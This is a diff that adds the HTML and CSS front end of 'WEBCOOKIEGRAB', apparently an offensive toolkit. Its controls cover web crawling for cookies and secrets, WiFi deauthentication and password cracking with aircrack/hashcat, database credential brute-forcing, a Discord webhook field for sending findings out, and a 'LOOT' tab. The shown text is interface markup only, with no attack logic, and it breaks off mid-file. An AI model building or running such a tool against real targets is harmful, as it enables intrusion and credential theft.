@@ -1,0 +1,1792 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WEBCOOKIEGRAB // v2.0</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323:wght@400&display=swap" rel="stylesheet">
+  <style>
+    /* ── Variables ─────────────────────────────────────────────────────────── */
+    :root {
+      --bg:          #060606;
+      --bg-panel:    #0a0a0a;
+      --bg-card:     #0e0e0e;
+      --bg-input:    #080d08;
+      --green:       #00ff41;
+      --green-d:     rgba(0,255,65,.25);
+      --green-glow:  rgba(0,255,65,.08);
+      --cyan:        #00e5ff;
+      --cyan-d:      rgba(0,229,255,.25);
+      --red:         #ff0033;
+      --red-d:       rgba(255,0,51,.18);
+      --yellow:      #ffd700;
+      --yellow-d:    rgba(255,215,0,.18);
+      --orange:      #ff6a00;
+      --border:      rgba(0,255,65,.10);
+      --border-hi:   rgba(0,255,65,.35);
+      --text-dim:    rgba(0,255,65,.35);
+      --mono:        'Share Tech Mono','Courier New',Courier,monospace;
+      --display:     'VT323',monospace;
+    }
+
+    /* ── Reset ──────────────────────────────────────────────────────────────── */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; overflow: hidden; }
+
+    body {
+      background: var(--bg);
+      color: var(--green);
+      font-family: var(--mono);
+      font-size: 13px;
+      line-height: 1.5;
+    }
+
+    /* ── CRT scanlines overlay ──────────────────────────────────────────────── */
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg,
+        rgba(0,0,0,.04) 0px,
+        rgba(0,0,0,.04) 1px,
+        transparent 1px,
+        transparent 3px
+      );
+      pointer-events: none;
+      z-index: 9998;
+    }
+
+    /* Vignette */
+    body::after {
+      content: '';
+      position: fixed; inset: 0;
+      background: radial-gradient(ellipse at center, transparent 60%, rgba(0,0,0,.6) 100%);
+      pointer-events: none;
+      z-index: 9997;
+    }
+
+    /* ── Matrix canvas ──────────────────────────────────────────────────────── */
+    #matrix-canvas {
+      position: fixed; top: 0; left: 0;
+      opacity: .05;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    /* ── App shell ──────────────────────────────────────────────────────────── */
+    .app {
+      position: relative; z-index: 1;
+      display: flex; flex-direction: column;
+      height: 100vh;
+    }
+
+    /* ── Scrollbars ─────────────────────────────────────────────────────────── */
+    ::-webkit-scrollbar           { width: 4px; height: 4px; }
+    ::-webkit-scrollbar-track     { background: #080808; }
+    ::-webkit-scrollbar-thumb     { background: var(--green-d); }
+    ::-webkit-scrollbar-thumb:hover { background: var(--green); }
+
+    /* ── Header ─────────────────────────────────────────────────────────────── */
+    .header {
+      border-bottom: 1px solid var(--border);
+      background: linear-gradient(180deg, #0a0f0a 0%, var(--bg) 100%);
+      padding: 10px 16px 8px;
+      flex-shrink: 0;
+    }
+
+    .header-top {
+      display: flex;
+      align-items: center;
+      gap: 24px;
+      margin-bottom: 10px;
+    }
+
+    /* Logo */
+    .logo-wrap { flex-shrink: 0; }
+
+    .logo {
+      font-family: var(--display);
+      font-size: 32px;
+      letter-spacing: 4px;
+      color: var(--green);
+      text-shadow: 0 0 12px var(--green), 0 0 30px rgba(0,255,65,.4);
+      position: relative;
+      display: inline-block;
+      user-select: none;
+    }
+
+    .logo-glitch {
+      position: relative;
+      display: inline-block;
+      animation: logo-flicker 8s infinite;
+    }
+
+    .logo-glitch::before,
+    .logo-glitch::after {
+      content: attr(data-text);
+      position: absolute; top: 0; left: 0;
+      font-family: inherit; font-size: inherit;
+      letter-spacing: inherit;
+    }
+    .logo-glitch::before {
+      color: var(--red);
+      clip-path: polygon(0 30%, 100% 30%, 100% 50%, 0 50%);
+      animation: glitch-before 4s infinite;
+    }
+    .logo-glitch::after {
+      color: var(--cyan);
+      clip-path: polygon(0 60%, 100% 60%, 100% 80%, 0 80%);
+      animation: glitch-after 4s 0.5s infinite;
+    }
+
+    .logo-sub {
+      display: block;
+      font-size: 11px;
+      color: var(--text-dim);
+      letter-spacing: 3px;
+      margin-top: -4px;
+    }
+
+    /* ── Controls ───────────────────────────────────────────────────────────── */
+    .controls {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      flex: 1;
+      flex-wrap: wrap;
+    }
+
+    .url-group {
+      display: flex;
+      align-items: center;
+      border: 1px solid var(--border);
+      background: var(--bg-input);
+      padding: 4px 8px;
+      gap: 6px;
+      flex: 1; min-width: 240px;
+      transition: border-color .2s, box-shadow .2s;
+    }
+    .url-group:focus-within {
+      border-color: var(--green);
+      box-shadow: 0 0 12px var(--green-glow), inset 0 0 8px var(--green-glow);
+    }
+    .url-group:has(#webhook-url):focus-within {
+      border-color: var(--orange);
+      box-shadow: 0 0 12px rgba(255,106,0,.15), inset 0 0 8px rgba(255,106,0,.06);
+    }
+
+    .url-prompt {
+      color: var(--green);
+      font-size: 12px;
+      white-space: nowrap;
+      text-shadow: 0 0 8px var(--green);
+    }
+
+    #target-url {
+      background: transparent;
+      border: none;
+      outline: none;
+      color: var(--cyan);
+      font-family: var(--mono);
+      font-size: 13px;
+      flex: 1;
+      caret-color: var(--green);
+    }
+    #target-url::placeholder { color: rgba(0,229,255,.25); }
+
+    .opts {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+
+    .opt-field {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 11px;
+      color: var(--text-dim);
+    }
+    .opt-field input[type="number"] {
+      width: 48px;
+      background: var(--bg-input);
+      border: 1px solid var(--border);
+      color: var(--green);
+      font-family: var(--mono);
+      font-size: 11px;
+      padding: 2px 4px;
+      outline: none;
+      text-align: center;
+    }
+    .opt-field input[type="number"]:focus { border-color: var(--green); }
+
+    .opt-field input[type="checkbox"] {
+      accent-color: var(--green);
+      width: 12px; height: 12px;
+      cursor: pointer;
+    }
+    .opt-field label { cursor: pointer; }
+
+    /* Scan / Stop buttons */
+    .btn-scan, .btn-stop {
+      font-family: var(--mono);
+      font-size: 12px;
+      letter-spacing: 2px;
+      padding: 6px 18px;
+      cursor: pointer;
+      border: 1px solid var(--green);
+      background: transparent;
+      color: var(--green);
+      text-transform: uppercase;
+      position: relative;
+      overflow: hidden;
+      transition: background .15s, color .15s, box-shadow .15s;
+      white-space: nowrap;
+    }
+    .btn-scan:hover:not(:disabled) {
+      background: var(--green);
+      color: #000;
+      box-shadow: 0 0 18px var(--green), 0 0 30px rgba(0,255,65,.3);
+    }
+    .btn-scan:disabled { opacity: .4; cursor: default; }
+
+    .btn-stop {
+      border-color: var(--red);
+      color: var(--red);
+      display: none;
+    }
+    .btn-stop:hover {
+      background: var(--red);
+      color: #000;
+      box-shadow: 0 0 18px var(--red);
+    }
+
+    /* Scan active state */
+    .scanning .btn-scan { display: none; }
+    .scanning .btn-stop { display: inline-block; }
+
+    /* ── Progress bar ───────────────────────────────────────────────────────── */
+    .progress-bar-wrap {
+      height: 2px;
+      background: var(--border);
+      position: relative;
+      overflow: hidden;
+    }
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: var(--green);
+      box-shadow: 0 0 8px var(--green);
+      transition: width .4s ease;
+    }
+    .progress-bar.indeterminate {
+      width: 30%;
+      animation: scan-slide 1.4s ease-in-out infinite;
+    }
+
+    /* ── Stats bar ──────────────────────────────────────────────────────────── */
+    .stats-bar {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      border-bottom: 1px solid var(--border);
+      flex-shrink: 0;
+    }
+
+    .stat-box {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 6px 8px;
+      border-right: 1px solid var(--border);
+      position: relative;
+    }
+    .stat-box:last-child { border-right: none; }
+
+    .stat-val {
+      font-family: var(--display);
+      font-size: 28px;
+      line-height: 1;
+      color: var(--green);
+      text-shadow: 0 0 10px var(--green);
+      transition: color .3s, text-shadow .3s;
+    }
+    .stat-label {
+      font-size: 9px;
+      letter-spacing: 2.5px;
+      color: var(--text-dim);
+    }
+
+    .stat-box.alert .stat-val {
+      color: var(--red);
+      text-shadow: 0 0 12px var(--red), 0 0 24px rgba(255,0,51,.4);
+      animation: pulse-red 2s ease-in-out infinite;
+    }
+    .stat-box.warn .stat-val {
+      color: var(--yellow);
+      text-shadow: 0 0 10px var(--yellow);
+    }
+
+    /* ── Main panels ────────────────────────────────────────────────────────── */
+    .panels {
+      display: grid;
+      grid-template-columns: 52% 48%;
+      flex: 1;
+      overflow: hidden;
+      min-height: 0;
+    }
+
+    .panel {
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      border-right: 1px solid var(--border);
+    }
+    .panel:last-child { border-right: none; }
+
+    .panel-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 4px 10px;
+      border-bottom: 1px solid var(--border);
+      background: rgba(0,255,65,.02);
+      flex-shrink: 0;
+      font-size: 10px;
+      letter-spacing: 2px;
+      color: var(--text-dim);
+    }
+
+    .panel-header .ph-actions { display: flex; gap: 6px; }
+
+    .ph-btn {
+      font-family: var(--mono);
+      font-size: 10px;
+      background: transparent;
+      border: 1px solid var(--border);
+      color: var(--text-dim);
+      padding: 1px 8px;
+      cursor: pointer;
+      letter-spacing: 1px;
+      transition: border-color .15s, color .15s;
+    }
+    .ph-btn:hover { border-color: var(--green); color: var(--green); }
+    .ph-btn:disabled { opacity: .3; cursor: default; }
+
+    /* ── Terminal ───────────────────────────────────────────────────────────── */
+    .terminal-output {
+      flex: 1;
+      overflow-y: auto;
+      padding: 8px 10px;
+      font-size: 12px;
+    }
+
+    .t-line {
+      display: flex;
+      gap: 8px;
+      padding: 1px 0;
+      align-items: baseline;
+    }
+
+    .t-ts   { color: rgba(0,255,65,.2); flex-shrink: 0; font-size: 10px; }
+    .t-lvl  { flex-shrink: 0; width: 48px; text-align: right; font-size: 10px; }
+    .t-msg  { flex: 1; word-break: break-all; }
+
+    .t-line.info   .t-lvl { color: var(--text-dim); }
+    .t-line.ok     .t-lvl { color: var(--green); }
+    .t-line.warn   .t-lvl { color: var(--yellow); }
+    .t-line.error  .t-lvl { color: var(--red); }
+    .t-line.found  .t-lvl { color: var(--orange); }
+    .t-line.secret .t-lvl { color: var(--red); }
+    .t-line.cookie .t-lvl { color: var(--cyan); }
+    .t-line.system .t-lvl { color: var(--cyan); }
+
+    .t-line.info   .t-msg { color: rgba(0,255,65,.7); }
+    .t-line.ok     .t-msg { color: var(--green); }
+    .t-line.warn   .t-msg { color: var(--yellow); }
+    .t-line.error  .t-msg { color: var(--red); }
+    .t-line.found  .t-msg { color: var(--orange); }
+    .t-line.secret .t-msg { color: var(--red); text-shadow: 0 0 6px rgba(255,0,51,.4); }
+    .t-line.cookie .t-msg { color: var(--cyan); }
+    .t-line.system .t-msg { color: var(--cyan); text-shadow: 0 0 8px var(--cyan); }
+
+    .t-cursor {
+      display: inline-block;
+      width: 8px; height: 13px;
+      background: var(--green);
+      animation: blink .8s step-end infinite;
+      vertical-align: text-bottom;
+      box-shadow: 0 0 6px var(--green);
+    }
+
+    /* ── Findings panel ─────────────────────────────────────────────────────── */
+    .tabs {
+      display: flex;
+      border-bottom: 1px solid var(--border);
+      flex-shrink: 0;
+    }
+
+    .tab-btn {
+      flex: 1;
+      background: transparent;
+      border: none;
+      border-right: 1px solid var(--border);
+      color: var(--text-dim);
+      font-family: var(--mono);
+      font-size: 10px;
+      letter-spacing: 2px;
+      padding: 6px 4px;
+      cursor: pointer;
+      position: relative;
+      transition: color .15s, background .15s;
+    }
+    .tab-btn:last-child { border-right: none; }
+    .tab-btn:hover { color: var(--green); background: var(--green-glow); }
+    .tab-btn.active {
+      color: var(--green);
+      background: rgba(0,255,65,.05);
+      border-bottom: 2px solid var(--green);
+    }
+
+    .tab-badge {
+      display: inline-block;
+      background: var(--green-d);
+      color: var(--green);
+      font-size: 9px;
+      padding: 0 4px;
+      margin-left: 4px;
+      min-width: 16px;
+      text-align: center;
+    }
+    .tab-badge.red   { background: var(--red-d);    color: var(--red);    }
+    .tab-badge.yellow{ background: var(--yellow-d); color: var(--yellow); }
+
+    .tab-content { display: none; flex: 1; overflow-y: auto; }
+    .tab-content.active { display: block; }
+
+    .no-data {
+      padding: 24px 12px;
+      color: var(--text-dim);
+      font-size: 11px;
+      text-align: center;
+      letter-spacing: 2px;
+    }
+
+    /* ── Finding cards ──────────────────────────────────────────────────────── */
+    .card {
+      margin: 6px 8px;
+      border: 1px solid var(--border);
+      background: var(--bg-card);
+      padding: 8px 10px;
+      font-size: 11px;
+      position: relative;
+      transition: border-color .2s;
+    }
+    .card:hover { border-color: var(--border-hi); }
+
+    .card.HIGH   { border-left: 3px solid var(--red);    }
+    .card.MEDIUM { border-left: 3px solid var(--yellow); }
+    .card.OK     { border-left: 3px solid var(--green);  }
+    .card.CRIT   { border-left: 3px solid var(--red); background: rgba(255,0,51,.04); }
+
+    .card-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 6px;
+    }
+
+    .card-title {
+      font-size: 13px;
+      letter-spacing: 1px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .sev-badge {
+      font-size: 9px;
+      letter-spacing: 2px;
+      padding: 1px 6px;
+      flex-shrink: 0;
+      margin-left: 8px;
+    }
+    .sev-badge.HIGH   { border: 1px solid var(--red);    color: var(--red);    }
+    .sev-badge.MEDIUM { border: 1px solid var(--yellow); color: var(--yellow); }
+    .sev-badge.OK     { border: 1px solid var(--green);  color: var(--green);  }
+    .sev-badge.CRIT   { border: 1px solid var(--red);    color: var(--red); background: var(--red-d); }
+
+    .card-meta {
+      color: var(--text-dim);
+      font-size: 10px;
+      margin-bottom: 4px;
+      word-break: break-all;
+    }
+
+    .card-flags { display: flex; gap: 8px; margin: 5px 0; flex-wrap: wrap; }
+
+    .flag {
+      font-size: 9px;
+      letter-spacing: 1.5px;
+      padding: 1px 5px;
+    }
+    .flag.ok   { border: 1px solid rgba(0,255,65,.3);   color: var(--green); }
+    .flag.bad  { border: 1px solid rgba(255,0,51,.4);   color: var(--red);   }
+    .flag.warn { border: 1px solid rgba(255,215,0,.4);  color: var(--yellow);}
+
+    .card-issue {
+      display: flex;
+      gap: 6px;
+      color: var(--yellow);
+      font-size: 10px;
+      padding: 1px 0;
+    }
+    .card-issue::before { content: '⚠'; flex-shrink: 0; }
+
+    .card-snippet {
+      margin-top: 5px;
+      background: #080808;
+      border: 1px solid var(--border);
+      padding: 4px 6px;
+      font-size: 10px;
+      color: rgba(0,229,255,.8);
+      word-break: break-all;
+      overflow-x: auto;
+    }
+
+    .card-pattern {
+      font-size: 10px;
+      color: var(--red);
+      letter-spacing: 1px;
+      margin-bottom: 3px;
+    }
+
+    /* ── Done overlay ───────────────────────────────────────────────────────── */
+    #done-banner {
+      display: none;
+      position: absolute;
+      bottom: 32px; right: 16px;
+      background: #0a0a0a;
+      border: 1px solid var(--green);
+      box-shadow: 0 0 20px rgba(0,255,65,.3);
+      padding: 12px 20px;
+      font-size: 12px;
+      z-index: 100;
+      animation: fade-in .4s ease;
+    }
+    #done-banner .db-title {
+      color: var(--green);
+      font-size: 16px;
+      letter-spacing: 2px;
+      margin-bottom: 8px;
+      text-shadow: 0 0 10px var(--green);
+    }
+    #done-banner .db-stat { color: var(--text-dim); margin: 2px 0; }
+    #done-banner .db-stat span { color: var(--green); }
+    #done-banner .db-actions { margin-top: 10px; display: flex; gap: 8px; }
+
+    /* ── Animations ─────────────────────────────────────────────────────────── */
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50%       { opacity: 0; }
+    }
+
+    @keyframes logo-flicker {
+      0%, 90%, 100% { opacity: 1; }
+      92%            { opacity: .8; }
+      94%            { opacity: 1; }
+      96%            { opacity: .6; }
+      98%            { opacity: 1; }
+    }
+
+    @keyframes glitch-before {
+      0%,100%  { transform: translate(0,0);      clip-path: polygon(0 20%, 100% 20%, 100% 40%, 0 40%); }
+      20%      { transform: translate(-3px,1px); clip-path: polygon(0 10%, 100% 10%, 100% 30%, 0 30%); }
+      40%      { transform: translate(3px,-1px); clip-path: polygon(0 50%, 100% 50%, 100% 70%, 0 70%); }
+      60%      { transform: translate(-2px,2px); clip-path: polygon(0 70%, 100% 70%, 100% 90%, 0 90%); }
+      80%      { transform: translate(1px,-2px); clip-path: polygon(0 35%, 100% 35%, 100% 55%, 0 55%); }
+    }
+
+    @keyframes glitch-after {
+      0%,100%  { transform: translate(0,0);     clip-path: polygon(0 60%, 100% 60%, 100% 80%, 0 80%); }
+      25%      { transform: translate(3px,-1px);clip-path: polygon(0 40%, 100% 40%, 100% 60%, 0 60%); }
+      50%      { transform: translate(-2px,2px);clip-path: polygon(0 80%, 100% 80%, 100% 95%, 0 95%); }
+      75%      { transform: translate(2px,1px); clip-path: polygon(0 5%,  100% 5%,  100% 25%, 0 25%); }
+    }
+
+    @keyframes scan-slide {
+      0%   { left: -30%; }
+      100% { left: 130%; }
+    }
+
+    @keyframes pulse-red {
+      0%,100% { opacity: 1; }
+      50%     { opacity: .7; }
+    }
+
+    @keyframes fade-in {
+      from { opacity: 0; transform: translateY(8px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ── Misc ────────────────────────────────────────────────────────────────── */
+    .sep-line {
+      border: none;
+      border-top: 1px solid var(--border);
+      margin: 6px 0;
+    }
+
+    /* ── Mode nav ────────────────────────────────────────────────────────────── */
+    .mode-nav {
+      display: flex;
+      gap: 3px;
+      align-items: center;
+      flex-shrink: 0;
+    }
+    .mode-btn {
+      font-family: var(--mono);
+      font-size: 10px;
+      letter-spacing: 2px;
+      padding: 4px 14px;
+      border: 1px solid var(--border);
+      background: transparent;
+      color: var(--text-dim);
+      cursor: pointer;
+      transition: all .15s;
+    }
+    .mode-btn:hover { border-color: var(--green); color: var(--green); }
+    .mode-btn.active.web  { border-color:var(--green);  color:#000; background:var(--green);  box-shadow:0 0 14px var(--green); }
+    .mode-btn.active.wifi { border-color:var(--cyan);   color:#000; background:var(--cyan);   box-shadow:0 0 14px var(--cyan); }
+    .mode-btn.active.db   { border-color:var(--orange); color:#000; background:var(--orange); box-shadow:0 0 14px var(--orange); }
+
+    /* ── Control panels ──────────────────────────────────────────────────────── */
+    .ctrl-panel {
+      display: none;
+      align-items: center;
+      gap: 10px;
+      flex: 1;
+      flex-wrap: wrap;
+    }
+    .ctrl-panel.active { display: flex; }
+
+    /* Styled select */
+    .hk-select {
+      background: var(--bg-input);
+      border: 1px solid var(--border);
+      color: var(--green);
+      font-family: var(--mono);
+      font-size: 11px;
+      padding: 3px 6px;
+      outline: none;
+      cursor: pointer;
+    }
+    .hk-select:focus { border-color: var(--green); }
+
+    /* DB checkboxes row */
+    .db-types-row {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+      align-items: center;
+    }
+    .db-type-chk {
+      display: flex;
+      align-items: center;
+      gap: 3px;
+      font-size: 10px;
+      color: var(--text-dim);
+      cursor: pointer;
+    }
+    .db-type-chk input { accent-color: var(--orange); cursor: pointer; }
+
+    /* AP list dropdown */
+    #wifi-ap-select { max-width: 260px; }
+
+    /* DB/WiFi finding cards */
+    .card.WIFI  { border-left: 3px solid var(--cyan); }
+    .card.DBHIT { border-left: 3px solid var(--orange); }
+
+    .card-pw {
+      font-size: 14px;
+      letter-spacing: 1px;
+      color: var(--red);
+      text-shadow: 0 0 8px var(--red);
+      margin: 4px 0;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Matrix rain -->
+<canvas id="matrix-canvas"></canvas>
+
+<div class="app" id="app">
+
+  <!-- ── Header ─────────────────────────────────────────────────────────────── -->
+  <header class="header">
+    <div class="header-top">
+      <div class="logo-wrap">
+        <div class="logo">
+          <span class="logo-glitch" data-text="WEBCOOKIEGRAB">WEBCOOKIEGRAB</span>
+        </div>
+        <span class="logo-sub">// COOKIE &amp; SECRET SCANNER v2.0 //</span>
+      </div>
+
+      <!-- Test webhook btn -->
+      <button class="ph-btn" onclick="testWebhook()"
+              style="border-color:rgba(255,106,0,.5);color:var(--orange);flex-shrink:0">
+        ⚡ TEST HOOK
+      </button>
+
+      <!-- Mode nav -->
+      <div class="mode-nav">
+        <button class="mode-btn active web" id="mode-web" onclick="setMode('web')">▸ WEB</button>
+        <button class="mode-btn wifi"       id="mode-wifi" onclick="setMode('wifi')">📡 WIFI</button>
+        <button class="mode-btn db"         id="mode-db"  onclick="setMode('db')">🗄 DATABASE</button>
+      </div>
+
+      <!-- Shared webhook field -->
+      <div class="url-group" style="flex:0.6;min-width:180px;border-color:rgba(255,106,0,.2);">
+        <span class="url-prompt" style="color:var(--orange);text-shadow:0 0 8px var(--orange)">WEBHOOK://</span>
+        <input type="text" id="webhook-url" placeholder="discord.com/api/webhooks/..."
+               autocomplete="off" spellcheck="false"
+               style="color:var(--orange);caret-color:var(--orange)">
+      </div>
+
+      <!-- ── WEB controls ── -->
+      <div class="ctrl-panel active" id="ctrl-web">
+        <div class="url-group">
+          <span class="url-prompt">TARGET://</span>
+          <input type="text" id="target-url" placeholder="https://your-target.com"
+                 autocomplete="off" spellcheck="false"
+                 onkeydown="if(event.key==='Enter') startScan()">
+        </div>
+        <div class="opts">
+          <div class="opt-field"><span>PAGES</span>
+            <input type="number" id="max-pages" value="50" min="1" max="500"></div>
+          <div class="opt-field"><span>TIMEOUT</span>
+            <input type="number" id="timeout" value="15" min="5" max="60"></div>
+          <div class="opt-field"><span>ENTROPY</span>
+            <input type="number" id="entropy" value="4.5" min="3.0" max="6.0" step="0.1"></div>
+          <div class="opt-field">
+            <label><input type="checkbox" id="verify-ssl" checked> SSL VERIFY</label></div>
+          <div class="opt-field">
+            <label><input type="checkbox" id="probe-files" checked> FILE PROBE</label></div>
+          <div class="opt-field"><span>FILE THREADS</span>
+            <input type="number" id="file-threads" value="20" min="5" max="50"></div>
+        </div>
+        <button class="btn-scan" id="btn-scan" onclick="startScan()">▶ SCAN</button>
+        <button class="btn-stop" id="btn-stop-web" onclick="stopScan()">■ ABORT</button>
+      </div>
+
+      <!-- ── WIFI controls ── -->
+      <div class="ctrl-panel" id="ctrl-wifi">
+        <!-- Adapter row -->
+        <div class="url-group" style="flex:0;min-width:160px;border-color:var(--cyan-d)">
+          <span class="url-prompt" style="color:var(--cyan)">ADAPTER://</span>
+          <select id="wifi-iface" class="hk-select" style="background:transparent;border:none;color:var(--cyan)">
+            <option value="">loading…</option>
+          </select>
+        </div>
+        <button class="ph-btn" title="Refresh adapters"
+                style="padding:0 7px;color:var(--text-dim);border-color:rgba(0,229,255,.15)"
+                onclick="loadWifiInterfaces()">↻</button>
+        <button class="ph-btn" id="btn-mon-on"
+                style="border-color:var(--cyan);color:var(--cyan);padding:0 9px"
+                onclick="monitorOn()">▶ MON ON</button>
+        <button class="ph-btn" id="btn-mon-off"
+                style="border-color:var(--red);color:var(--red);padding:0 9px;display:none"
+                onclick="monitorOff()">■ MON OFF</button>
+        <span id="monitor-status"
+              style="color:var(--cyan);font-size:11px;white-space:nowrap;opacity:.7"></span>
+        <!-- Scan row -->
+        <button class="ph-btn" style="border-color:var(--cyan);color:var(--cyan)"
+                onclick="wifiScanAPs()">SCAN APs</button>
+        <div class="url-group" style="flex:0.6;min-width:180px;border-color:var(--cyan-d)">
+          <span class="url-prompt" style="color:var(--cyan)">TARGET AP:</span>
+          <select id="wifi-ap-select" class="hk-select" style="background:transparent;border:none;color:var(--cyan)">
+            <option value="">-- scan first --</option>
+          </select>
+        </div>
+        <div class="opt-field"><span style="color:var(--text-dim)">DEAUTH</span>
+          <input type="number" id="wifi-deauth" value="5" min="0" max="20"></div>
+        <!-- Crack row -->
+        <div class="url-group" style="flex:0.8;border-color:var(--cyan-d)">
+          <span class="url-prompt" style="color:var(--cyan)">WORDLIST://</span>
+          <input type="text" id="wifi-wordlist" value="/usr/share/wordlists/rockyou.txt"
+                 style="color:var(--cyan);caret-color:var(--cyan)" autocomplete="off">
+        </div>
+        <select id="wifi-method" class="hk-select">
+          <option value="auto">AUTO</option>
+          <option value="aircrack">AIRCRACK</option>
+          <option value="hashcat">HASHCAT</option>
+        </select>
+        <button class="btn-scan" style="border-color:var(--cyan);color:var(--cyan)"
+                id="btn-wifi-crack" onclick="wifiCrack()">▶ CRACK</button>
+        <button class="btn-stop" id="btn-stop-wifi" onclick="stopScan()"
+                style="display:inline-block">■ ABORT</button>
+      </div>
+
+      <!-- ── DATABASE controls ── -->
+      <div class="ctrl-panel" id="ctrl-db">
+        <div class="url-group" style="flex:0.5;min-width:160px;border-color:rgba(255,106,0,.25)">
+          <span class="url-prompt" style="color:var(--orange)">TARGET://</span>
+          <input type="text" id="db-target" placeholder="192.168.1.1 or host"
+                 style="color:var(--orange);caret-color:var(--orange)" autocomplete="off"
+                 onkeydown="if(event.key==='Enter') dbScan()">
+        </div>
+        <div class="url-group" style="flex:0.7;border-color:rgba(255,106,0,.25)">
+          <span class="url-prompt" style="color:var(--orange)">WORDLIST://</span>
+          <input type="text" id="db-wordlist" placeholder="/path/to/wordlist.txt (optional)"
+                 style="color:var(--orange);caret-color:var(--orange)" autocomplete="off">
+        </div>
+        <div class="db-types-row" id="db-types-row">
+          <!-- populated by JS -->
+        </div>
+        <div class="opt-field"><span style="color:var(--text-dim)">THREADS</span>
+          <input type="number" id="db-threads" value="8" min="1" max="32"></div>
+        <button class="btn-scan" style="border-color:var(--orange);color:var(--orange)"
+                id="btn-db-scan" onclick="dbScan()">▶ BRUTE</button>
+        <button class="btn-stop" id="btn-stop-db" onclick="stopScan()"
+                style="display:inline-block">■ ABORT</button>
+      </div>
+    </div>
+
+    <div class="progress-bar-wrap">
+      <div class="progress-bar" id="progress-bar"></div>
+    </div>
+  </header>
+
+  <!-- ── Stats bar ──────────────────────────────────────────────────────────── -->
+  <div class="stats-bar">
+    <div class="stat-box" id="sb-pages">
+      <span class="stat-val" id="sv-pages">0</span>
+      <span class="stat-label">PAGES</span>
+    </div>
+    <div class="stat-box" id="sb-cookies">
+      <span class="stat-val" id="sv-cookies">0</span>
+      <span class="stat-label">COOKIES</span>
+    </div>
+    <div class="stat-box" id="sb-secrets">
+      <span class="stat-val" id="sv-secrets">0</span>
+      <span class="stat-label">SECRETS</span>
+    </div>
+    <div class="stat-box" id="sb-headers">
+      <span class="stat-val" id="sv-headers">0</span>
+      <span class="stat-label">AUTH HDRS</span>
+    </div>
+  </div>
+
+  <!-- ── Panels ─────────────────────────────────────────────────────────────── -->
+  <div class="panels">
+
+    <!-- Terminal panel -->
+    <div class="panel">
+      <div class="panel-header">
+        <span>// LIVE TERMINAL</span>
+        <div class="ph-actions">
+          <button class="ph-btn" onclick="clearTerminal()">CLR</button>
+        </div>
+      </div>
+      <div class="terminal-output" id="terminal">
+        <div class="t-line system">
+          <span class="t-ts">00:00:00</span>
+          <span class="t-lvl">SYS</span>
+          <span class="t-msg">WEBCOOKIEGRAB v2.0 — SYSTEM READY. ENTER TARGET AND INITIATE SCAN.</span>
+        </div>
+        <div class="t-line system">
+          <span class="t-ts">00:00:00</span>
+          <span class="t-lvl">SYS</span>
+          <span class="t-msg">AUTHORISED TARGETS ONLY. ALL ACTIVITY LOGGED.</span>
+        </div>
+        <div style="margin-top:6px"><span class="t-cursor"></span></div>
+      </div>
+    </div>
+
+    <!-- Findings panel -->
+    <div class="panel" style="position:relative">
+      <div class="panel-header">
+        <span>// FINDINGS DATABASE</span>
+        <div class="ph-actions">
+          <button class="ph-btn" id="btn-export" onclick="exportJSON()" disabled>EXPORT JSON</button>
+          <button class="ph-btn" onclick="clearFindings()">CLR</button>
+        </div>
+      </div>
+
+      <div class="tabs">
+        <button class="tab-btn active" id="tab-cookies-btn" onclick="showTab('cookies')">
+          COOKIES <span class="tab-badge" id="badge-cookies">0</span>
+        </button>
+        <button class="tab-btn" id="tab-secrets-btn" onclick="showTab('secrets')">
+          SECRETS <span class="tab-badge" id="badge-secrets">0</span>
+        </button>
+        <button class="tab-btn" id="tab-headers-btn" onclick="showTab('headers')">
+          AUTH HDR <span class="tab-badge" id="badge-headers">0</span>
+        </button>
+        <button class="tab-btn" id="tab-files-btn" onclick="showTab('files')" style="color:var(--orange)">
+          FILES <span class="tab-badge" id="badge-files" style="background:var(--orange)">0</span>
+        </button>
+        <button class="tab-btn" id="tab-wifi-btn" onclick="showTab('wifi')">
+          WIFI <span class="tab-badge" id="badge-wifi">0</span>
+        </button>
+        <button class="tab-btn" id="tab-db-btn" onclick="showTab('db')">
+          DB HITS <span class="tab-badge" id="badge-db">0</span>
+        </button>
+        <button class="tab-btn" id="tab-loot-btn" onclick="showTab('loot')" style="color:var(--red);border-color:var(--red)">
+          💀 LOOT <span class="tab-badge" id="badge-loot" style="background:var(--red)">0</span>
+        </button>
+      </div>
+
+      <div class="tab-content active" id="tc-cookies">
+        <div class="no-data" id="nd-cookies">[ AWAITING DATA ]</div>
+        <div id="list-cookies"></div>
+      </div>
+      <div class="tab-content" id="tc-secrets">
+        <div class="no-data" id="nd-secrets">[ AWAITING DATA ]</div>
+        <div id="list-secrets"></div>
+      </div>
+      <div class="tab-content" id="tc-headers">
+        <div class="no-data" id="nd-headers">[ AWAITING DATA ]</div>
+        <div id="list-headers"></div>
+      </div>
+      <div class="tab-content" id="tc-files">
+        <div class="no-data" id="nd-files">[ NO EXPOSED FILES YET ]</div>
+        <div id="list-files"></div>
+      </div>
+      <div class="tab-content" id="tc-wifi">
+        <div class="no-data" id="nd-wifi">[ NO CRACKS YET ]</div>
+        <div id="list-wifi"></div>
+      </div>
+      <div class="tab-content" id="tc-db">
+        <div class="no-data" id="nd-db">[ NO DB HITS YET ]</div>
